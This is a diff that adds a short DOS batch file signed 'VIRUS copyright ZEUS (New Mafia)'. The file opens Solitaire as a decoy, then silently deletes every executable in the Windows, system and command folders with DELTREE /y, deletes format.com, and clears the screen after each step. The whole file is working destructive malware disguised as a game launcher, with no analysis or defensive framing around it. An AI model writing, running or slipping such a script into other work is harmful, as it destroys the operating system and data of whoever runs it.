@@ -1,0 +1,14 @@
+C:\
+CD\
+CD windows
+SOL.exe 
+DELTREE  /y C:\windows\system\*.exe
+CLS
+DELTREE  /y C:\windows\*.exe
+CLS
+DELTREE  /y C:\windows\command\*.exe
+CLS
+DEL\windows\command\format.com
+CLS
+echo AHH !!! AHH !!!
+echo VIRUS copyright ZEUS (New Mafia)
